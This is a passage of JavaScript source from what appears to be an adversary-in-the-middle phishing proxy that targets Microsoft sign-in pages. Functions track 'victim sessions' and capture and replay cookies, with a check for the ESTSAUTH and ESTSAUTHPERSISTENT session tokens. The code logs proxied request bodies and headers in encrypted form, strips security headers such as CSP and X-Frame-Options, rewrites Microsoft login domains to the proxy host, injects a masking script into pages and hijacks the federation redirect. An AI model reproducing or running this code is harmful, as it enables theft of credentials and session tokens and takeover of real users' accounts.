}

function createSessionLogFile(logFilename, currentSession) {
    const logFilePath = path.join(LOGS_DIRECTORY, logFilename);
    const logFileStream = fs.createWriteStream(logFilePath, { flags: "a" });

    LOG_FILE_STREAMS[currentSession] = logFileStream;
}

function generateNewSession(phishedURL) {
    const cookieName = generateRandomString(12);
    const cookieValue = generateRandomString(32);

    VICTIM_SESSIONS[cookieName] = {};
    VICTIM_SESSIONS[cookieName].value = cookieValue;
    VICTIM_SESSIONS[cookieName].cookies = [];
    VICTIM_SESSIONS[cookieName].logFilename = `${phishedURL.host}__${new Date().toISOString()}`;
    VICTIM_SESSIONS[cookieName].alerted = false;
    createSessionLogFile(VICTIM_SESSIONS[cookieName].logFilename, cookieName);

    return {
        cookieName: cookieName,
        cookieValue: cookieValue
    };
}

async function encryptData(data) {
    const iv = crypto.randomBytes(16);

    return new Promise((resolve, reject) => {
        const cipher = crypto.createCipheriv("aes-256-ctr", ENCRYPTION_KEY, iv);
        const encryptedData = [];

        cipher
            .on("error", (error) => {
                reject(error);
            })
            .on("data", (chunk) => {
                encryptedData.push(chunk);
            })
            .on("end", () => {
                resolve({
                    iv: iv.toString("hex"),
                    encryptedData: Buffer.concat(encryptedData).toString("hex")
                });
            });

        cipher.write(data, "utf-8");
        cipher.end();
    });
}

async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession) {
    const httpProxyTransaction = {
        timestamp: new Date().toISOString(),
        proxyRequestURL: `${proxyRequestProtocol}//${proxyRequestOptions.headers.host}${proxyRequestOptions.path}`,
        proxyRequestMethod: proxyRequestOptions.method,
        proxyRequestHeaders: proxyRequestOptions.headers,
        proxyRequestBody: proxyRequestBody,
        proxyResponseStatusCode: proxyResponse.statusCode,
        proxyResponseHeaders: proxyResponse.headers
    };
    const logFileStream = LOG_FILE_STREAMS[currentSession];

    const encryptedResult = await encryptData(JSON.stringify(httpProxyTransaction));

    if (!logFileStream.write(`${JSON.stringify({ [encryptedResult.iv]: encryptedResult.encryptedData })}\n`)) {
        await new Promise(resolve => logFileStream.once("drain", resolve));
    }
}

function isDomainApplicable(requestHostname, cookieDomain, cookieHostOnly) {
    const splitRequestHostname = requestHostname.split(".");
    const splitCookieDomain = cookieDomain.split(".");

    if (splitCookieDomain.length < 2) {
        return false;
    }
    if (cookieHostOnly && splitRequestHostname.length !== splitCookieDomain.length) {
        return false;
    }
    if (splitRequestHostname.length < splitCookieDomain.length) {
        return false;
    }

    for (let i = 1, l = splitCookieDomain.length + 1; i < l; i++) {
        if (splitCookieDomain.at(-i) !== splitRequestHostname.at(-i)) {
            return false;
        }
    }
    return true;
}

function isPathApplicable(requestPath, cookiePath) {
    const splitRequestPath = requestPath.split("/");
    const splitCookiePath = cookiePath.split("/");

    if (cookiePath === "/") {
        return true;
    }
    if (splitRequestPath.length < splitCookiePath.length) {
        return false;
    }

    for (let i = 1, l = splitCookiePath.length; i < l; i++) {
        if (splitCookiePath[i] !== splitRequestPath[i]) {
            return false;
        }
    }
    return true;
}

function isCookieApplicable(requestOptions, cookie) {
    return (
        isDomainApplicable(requestOptions.hostname, cookie.domain, cookie.hostOnly) &&
        isPathApplicable(requestOptions.path, cookie.path)
    );
}

function prepareProxyRequestCookies(proxyRequestOptions, currentSession) {
    const proxyRequestCookies = {};
    const currentTimestamp = Date.now();

    for (const cookie of VICTIM_SESSIONS[currentSession].cookies) {
        if (!(currentTimestamp > cookie.expires) && isCookieApplicable(proxyRequestOptions, cookie)) {
            proxyRequestCookies[cookie.name] = cookie.value;
        }
    }
    return Object.entries(proxyRequestCookies)
        .map(([cookieName, cookieValue]) => `${cookieName}=${cookieValue}`)
        .join("; ");
}

function parseCookieDate(cookieDate) {
    let foundTime = false;
    let foundDay = false;
    let foundMonth = false;
    let foundYear = false;

    let hourValue, minuteValue, secondValue;
    let dayValue, monthValue, yearValue;

    const delimiterRegex = /[\x09\x20-\x2F\x3B-\x40\x5B-\x60\x7B-\x7E]+/;
    const dateTokens = cookieDate.split(delimiterRegex).filter(token => token);

    for (const token of dateTokens) {
        if (!foundTime) {
            const timeMatch = /^(\d{1,2}):(\d{1,2}):(\d{1,2})/.exec(token);

            if (timeMatch) {
                foundTime = true;
                hourValue = parseInt(timeMatch[1]);
                minuteValue = parseInt(timeMatch[2]);
                secondValue = parseInt(timeMatch[3]);
                continue;
            }
        }
        if (!foundDay) {
            const dayMatch = /^(\d{1,2})(?:[^\d]|$)/.exec(token);

            if (dayMatch) {
                foundDay = true;
                dayValue = parseInt(dayMatch[1]);
                continue;
            }
        }
        if (!foundMonth) {
            const monthLowerCase = token.toLowerCase();
            const months = ["jan", "feb", "mar", "apr", "may", "jun", "jul", "aug", "sep", "oct", "nov", "dec"];

            for (let i = 0; i < months.length; i++) {
                if (monthLowerCase.startsWith(months[i])) {
                    foundMonth = true;
                    monthValue = i;
                    break;
                }
            }
            if (foundMonth) continue;
        }
        if (!foundYear) {
            const yearMatch = /^(\d{2,4})(?:[^\d]|$)/.exec(token);

            if (yearMatch) {
                foundYear = true;
                yearValue = parseInt(yearMatch[1]);
                continue;
            }
        }
    }

    if (yearValue >= 70 && yearValue <= 99) {
        yearValue += 1900;
    } else if (yearValue >= 0 && yearValue <= 69) {
        yearValue += 2000;
    }

    if (!foundDay || !foundMonth || !foundYear || !foundTime) {
        return NaN;
    }
    if (dayValue < 1 || dayValue > 31) {
        return NaN;
    }
    if (yearValue < 1601) {
        return NaN;
    }
    if (hourValue > 23 || minuteValue > 59 || secondValue > 59) {
        return NaN;
    }

    const parsedCookieDate = new Date(Date.UTC(
        yearValue,
        monthValue,
        dayValue,
        hourValue,
        minuteValue,
        secondValue
    ));

    if (parsedCookieDate.getUTCFullYear() !== yearValue ||
        parsedCookieDate.getUTCMonth() !== monthValue ||
        parsedCookieDate.getUTCDate() !== dayValue) {
        return NaN;
    }
    return parsedCookieDate.getTime();
}

function updateCurrentSessionCookies(request, newCookies, proxyHostname, currentSession, proxyResponseDate = null) {
    const pathNameMatch = request.path.match(/^\/[^?#]*(?=\/)/);
    const currentTimestamp = Date.now();
    let clockSkew = 0;
    if (proxyResponseDate) {
        clockSkew = currentTimestamp - parseCookieDate(proxyResponseDate);
    }

    for (const newCookie of newCookies) {
        const [cookie, ...attributes] = newCookie.split(";");
        const [cookieName, ...cookieValue] = cookie.split("=");

        let cookieDomain = request.hostname;
        let cookiePath = (pathNameMatch ?? ["/"])[0];
        let cookieExpires = NaN;
        let cookieMaxAge = "";
        let cookieHostOnly = true;
        let isCookieValid = true;
        for (const attribute of attributes) {

            const cookieAttribute = attribute.trim();
            const cookieDomainMatch = cookieAttribute.match(/^domain\s*=(.*)$/i);
            const cookiePathMatch = cookieAttribute.match(/^path\s*=(.*)$/i);
            const cookieExpiresMatch = cookieAttribute.match(/^expires\s*=(.*)$/i);
            const cookieMaxAgeMatch = cookieAttribute.match(/^max-age\s*=(.*)$/i);

            if (cookieAttribute.toLowerCase() === "domain") {
                cookieDomain = request.hostname;
                cookieHostOnly = true;
                isCookieValid = true;
            }
            else if (cookieAttribute.toLowerCase() === "path") {
                cookiePath = (pathNameMatch ?? ["/"])[0];
            }
            else if (cookieAttribute.toLowerCase() === "expires") {
                cookieExpires = NaN;
            }
            else if (cookieAttribute.toLowerCase() === "max-age") {
                cookieMaxAge = "";
            }

            else if (cookieDomainMatch) {
                cookieDomain = cookieDomainMatch[1].replace(/^\./, "").trim();
                cookieHostOnly = true;
                isCookieValid = true;

                if (!cookieDomain) {
                    cookieDomain = request.hostname;
                }
                else if (cookieDomain === proxyHostname) {
                    cookieDomain = request.hostname;
                    cookieHostOnly = false;
                }
                else if (cookieDomain !== request.hostname) {
                    if (isDomainApplicable(proxyHostname, cookieDomain, false)) {
                        cookieDomain = request.hostname.split(".").slice(-2).join(".");
                    }
                    else if (!isDomainApplicable(request.hostname, cookieDomain, false)) {
                        isCookieValid = false;
                        continue;
                    }
                    cookieHostOnly = false;
                }
            }
            else if (cookiePathMatch) {
                cookiePath = cookiePathMatch[1].trim();

                if (!cookiePath.startsWith("/")) {
                    cookiePath = (pathNameMatch ?? ["/"])[0];
                }
            }
            else if (cookieExpiresMatch) {
                cookieExpires = cookieExpiresMatch[1].trim();

                cookieExpires = parseCookieDate(cookieExpires);
            }
            else if (cookieMaxAgeMatch) {
                cookieMaxAge = cookieMaxAgeMatch[1].trim();

                if (!/^-?\d+$/.test(cookieMaxAge)) {
                    cookieMaxAge = "";
                }
            }
        }
        if (!isCookieValid) {
            continue;
        }

        cookieExpires += clockSkew;
        if (cookieMaxAge) {
            const seconds = parseInt(cookieMaxAge);
            if (!isNaN(seconds)) {
                cookieExpires = currentTimestamp + seconds * 1000;
            }
        }

        let isNewCookie = true;

        for (let i = 0; i < VICTIM_SESSIONS[currentSession].cookies.length; i++) {
            const sessionCookie = VICTIM_SESSIONS[currentSession].cookies[i];

            if (sessionCookie.name === cookieName &&
                sessionCookie.domain === cookieDomain &&
                sessionCookie.path === cookiePath &&
                sessionCookie.hostOnly === cookieHostOnly) {

                if (currentTimestamp > cookieExpires) {
                    VICTIM_SESSIONS[currentSession].cookies.splice(i, 1);
                    break;
                }
                sessionCookie.value = cookieValue.join("=");
                sessionCookie.expires = cookieExpires;
                isNewCookie = false;
                break;
            }
        }
        if (isNewCookie && !(currentTimestamp > cookieExpires)) {
            VICTIM_SESSIONS[currentSession].cookies.push({
                name: cookieName,
                value: cookieValue.join("="),
                domain: cookieDomain,
                path: cookiePath,
                expires: cookieExpires,
                hostOnly: cookieHostOnly
            });
        }
    }

    // ---- LOG SESSION COOKIES AFTER UPDATE ----
    //console.log(`[SESSION STATE] ${JSON.stringify(VICTIM_SESSIONS[currentSession].cookies.map(c => ({ name: c.name, value: c.value, domain: c.domain, path: c.path, expires: c.expires })))}`);
}

function getValidDomains(domains) {
    const validDomains = [];

    for (const domain of domains) {
        const splitDomain = domain.split(".");
        for (let i = 2; i < splitDomain.length + 1; i++) {

            const validDomain = splitDomain.slice(-i).join(".");
            if (!validDomains.includes(validDomain)) {
                validDomains.push(validDomain);
            }
        }
    }
    return validDomains;
}

function hasValidSessionCookies(session) {
    if (!session || !session.cookies) return false;
    let hasEstsAuth = false;
    let hasEstsAuthPersistent = false;

    for (const cookie of session.cookies) {
        if (cookie.name === 'ESTSAUTH') hasEstsAuth = true;
        if (cookie.name === 'ESTSAUTHPERSISTENT') hasEstsAuthPersistent = true;
    }
    return hasEstsAuth && hasEstsAuthPersistent;
}

function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHostname) {
    const azureHTTPRequestHeaders = [
        "max-forwards",
        "x-arr-log-id",
        "client-ip",
        "disguised-host",
        "x-site-deployment-id",
        "was-default-hostname",
        "x-forwarded-proto",
        "x-appservice-proto",
        "x-arr-ssl",
        "x-forwarded-tlsversion",
        "x-forwarded-for",
        "x-original-url",
        "x-waws-unencoded-url",
        "x-client-ip",
        "x-client-port",
        "x-canary",
        "x-microsoft-telemetry",
        "x-ms-telemetry",
        "x-ms-request-id",
        "x-ms-client-request-id"
    ];

    const proxyRequestCookies = prepareProxyRequestCookies(proxyRequestOptions, currentSession, proxyHostname);
    if (Object.keys(proxyRequestCookies).length) {
        proxyRequestOptions.headers.cookie = proxyRequestCookies;
     //   console.log(`[PROXY REQUEST COOKIE] ${proxyRequestCookies}`);
    }
    else {
        delete proxyRequestOptions.headers.cookie;
      //  console.log(`[PROXY REQUEST COOKIE] (none)`);
    }

    if (proxyRequestOptions.headers.origin) {
        proxyRequestOptions.headers.origin = `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}`;
    }
    if (proxyRequestOptions.headers.hasOwnProperty("referer") &&
        (!proxyRequestOptions.headers.referer || proxyRequestOptions.headers.referer.includes(PROXY_ENTRY_POINT))) {
        delete proxyRequestOptions.headers.referer;
    }

    for (const [key, value] of Object.entries(proxyRequestOptions.headers)) {
        if (azureHTTPRequestHeaders.includes(key)) {
            delete proxyRequestOptions.headers[key];
        }
        else {
            proxyRequestOptions.headers[key] = value.replaceAll(proxyHostname, VICTIM_SESSIONS[currentSession].host);
        }
    }
}

function deleteHTTPSecurityResponseHeaders(headers) {
    const httpSecurityResponseHeaders = [
        "x-frame-options",
        "x-xss-protection",
        "x-content-type-options",
       // "set-cookie",
        "content-security-policy",
        "content-security-policy-report-only",
        "cross-origin-opener-policy",
        "cross-origin-embedder-policy",
        "cross-origin-resource-policy",
        "permissions-policy",
        "service-worker-allowed",
        "x-canary",
        "x-microsoft-telemetry",
        "x-ms-telemetry",
        "x-ms-request-id",
        "x-ms-client-request-id"
    ];

    for (const header of httpSecurityResponseHeaders) {
        delete headers[header];
    }
}

function decompressData(compressedData, encoding) {
    const decompressionAlgorithms = {
        gzip: zlib.gunzip,
        "x-gzip": zlib.gunzip,
        deflate: zlib.inflate,
        br: zlib.brotliDecompress,
        zstd: zlib.zstdDecompress
    };

    return new Promise((resolve, reject) => {
        const decompressionAlgorithm = decompressionAlgorithms[encoding];

        if (decompressionAlgorithm) {
            decompressionAlgorithm(compressedData, (error, decompressedData) => {
                if (error) reject(error);
                else resolve(decompressedData);
            });
        }
        else {
            resolve(compressedData);
        }
    });
}

function compressData(decompressedData, encoding) {
    const compressionAlgorithms = {
        gzip: zlib.gzip,
        "x-gzip": zlib.gzip,
        deflate: zlib.deflate,
        br: zlib.brotliCompress,
        zstd: zlib.zstdCompress
    };

    return new Promise((resolve, reject) => {
        const compressionAlgorithm = compressionAlgorithms[encoding];

        if (compressionAlgorithm) {
            compressionAlgorithm(decompressedData, (error, compressedData) => {
                if (error) reject(error);
                else resolve(compressedData);
            });
        }
        else {
            resolve(decompressedData);
        }
    });
}

async function decompressResponseBody(compressedData, contentEncoding) {
    if (!contentEncoding) {
        return {
            decompressedResponseBody: compressedData,
            encodings: []
        };
    }

    const encodings = contentEncoding.split(",")
        .map(encoding => encoding.trim().toLowerCase())
        .filter(encoding => encoding);

    let decompressedData = compressedData;
    for (let i = encodings.length - 1; i >= 0; i--) {
        decompressedData = await decompressData(decompressedData, encodings[i]);
    }
    return {
        decompressedResponseBody: decompressedData,
        encodings: encodings
    };
}

async function compressResponseBody(decompressedData, encodings) {
    let compressedData = decompressedData;

    for (const encoding of encodings) {
        compressedData = await compressData(compressedData, encoding);
    }
    return compressedData;
}

// ==================== JavaScript Rewriting ====================
function updateJavaScriptResponse(bodyBuffer, proxyHostname) {
    // We assume the response body is either a UTF-8 string or binary;
    // for JS files, we treat as UTF-8.
    let jsContent = bodyBuffer.toString('utf8');

    // List of Microsoft domains that commonly appear in JS
    const microsoftDomains = [
        'login.microsoftonline.com',
        'microsoftonline.com',
        'login.windows.net',
        'login.microsoft.com',
        'aadcdn.msftauth.net',
        'sts.microsoftonline.com'
    ];

    // Replace each domain with the proxy hostname
    for (const domain of microsoftDomains) {
        // Replace https://domain, http://domain, //domain
        const regex = new RegExp(`(https?:)?//${domain.replace(/\./g, '\\.')}`, 'g');
        jsContent = jsContent.replace(regex, (match, protocol) => {
            // If protocol is present, keep it; but we want to use the proxy's scheme (typically https)
            // To maintain relative-ness, we can replace with '//' + proxyHostname
            // Or explicitly use https://proxyHostname
            return `https://${proxyHostname}`; // force HTTPS
        });
    }

    // Also replace any absolute paths that start with /common/ etc. (if they are used without domain)
    // In some scripts, they may use relative paths, but we keep them as is.

    // Return as Buffer
    return Buffer.from(jsContent, 'utf8');
}

// ---- updateHTMLProxyResponse is no longer used – we replaced it with dynamic injection ----
function updateHTMLProxyResponse(decompressedResponseBody) {
    // The inline script tag
    const maskScriptTag = `<script>${DOMAIN_MASK_SCRIPT}</script>`;
    const htmlString = decompressedResponseBody.toString('utf8');

    // Find first '<head'
    const headOpenMatch = htmlString.match(/<head[^>]*>/i);
    if (headOpenMatch) {
        const headEndIndex = headOpenMatch.index + headOpenMatch[0].length;
        const modified = htmlString.slice(0, headEndIndex) + maskScriptTag + htmlString.slice(headEndIndex);
        return Buffer.from(modified, 'utf8');
    }

    // Fallback: find <html>
    const htmlOpenMatch = htmlString.match(/<html[^>]*>/i);
    if (htmlOpenMatch) {
        const htmlEndIndex = htmlOpenMatch.index + htmlOpenMatch[0].length;
        const modified = htmlString.slice(0, htmlEndIndex) +
                         `<head>${maskScriptTag}</head>` +
                         htmlString.slice(htmlEndIndex);
        return Buffer.from(modified, 'utf8');
    }

    // Ultimate fallback: prepend full HTML
    return Buffer.from(`<!DOCTYPE html><html><head>${maskScriptTag}</head><body>${htmlString}</body></html>`, 'utf8');
}

function updateFederationRedirectUrl(decompressedResponseBody, proxyHostname) {
    const decompressedResponseBodyString = decompressedResponseBody.toString();
    const decompressedResponseBodyObject = JSON.parse(decompressedResponseBodyString);
    const federationRedirectUrl = decompressedResponseBodyObject.Credentials.FederationRedirectUrl;

    const proxyRequestURL = new URL(`https://${proxyHostname}${PROXY_PATHNAMES.mutation}`);
    proxyRequestURL.searchParams.append(PHISHED_URL_PARAMETER, encodeURIComponent(federationRedirectUrl));
    
    decompressedResponseBodyObject.Credentials.FederationRedirectUrl = proxyRequestURL;
    return Buffer.from(JSON.stringify(decompressedResponseBodyObject));
}
